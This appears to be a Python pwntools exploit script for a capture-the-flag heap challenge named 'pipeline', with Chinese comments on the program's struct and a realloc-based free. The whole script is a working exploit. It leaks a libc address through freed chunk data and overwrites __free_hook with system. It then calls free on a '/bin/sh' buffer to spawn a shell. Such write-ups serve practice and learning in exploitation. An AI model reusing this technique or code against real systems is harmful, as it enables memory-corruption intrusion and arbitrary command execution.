# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pipeline'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add():
    cmd(1)

def edit(idx , offset , size):
    cmd(2)
    sla('index' , idx)
    sla('offset' , offset)
    sla( 'size' , size)
# 实际上是 add data chunk

def delete(idx):
    cmd(3)
    sla('index' , idx)

def append(idx , size , data):
    cmd(4)
    sla('index' , idx)
    sla('size' , size)
    sla('data' , data)
# 实际上是 edit 

def show(idx):
    cmd(5)
    sla('index' , idx)

# one_gad = one_gadget(libc.path)

add() #0
edit(0 ,0 ,0x500)

# 第一个 0x20 大小的chuhk是最先申请的，我们分析时候不需要看
# chunk 结构如下 大小 0x20
# struct pipeline {
#    int64 *data;
#    int32 data_size;
#    int32 offset;
#    int64 *next_pipeline;
# };

add() #1
add() #2

edit(0 ,0 ,0)
edit(0 ,0 ,0x500)

# edit 里面是有 realloc ，realloc 是有隐藏 的 free 的
# 在创建数据 chunk 时没有要求输入，故完全可以泄露

show(0)

__malloc_hook = l64() - 0x70
libc.address = __malloc_hook - libc.sym['__malloc_hook']
system_addr = libc.sym['system']
__free_hook = libc.sym['__free_hook']
binsh_addr = libc.search('/bin/sh').next()

lg('__free_hook',__free_hook)

# dbg()

payload = flat(
    'a'*0x500 ,
    0 , 0x21,
    __free_hook , u64(p32(0) + p32(8)),
    0x100
)

append(0 , 0xffff2000 , payload[:-1])
append(1 , 8 , p64(system_addr)[:-1])
append(0 , 8 , "/bin/sh")

edit(0,0,0)

# dbg()


p.interactive()

'''
@File    :   pipeline.py
@Time    :   2021/10/08 18:16:01
@Author  :   Niyah 
'''
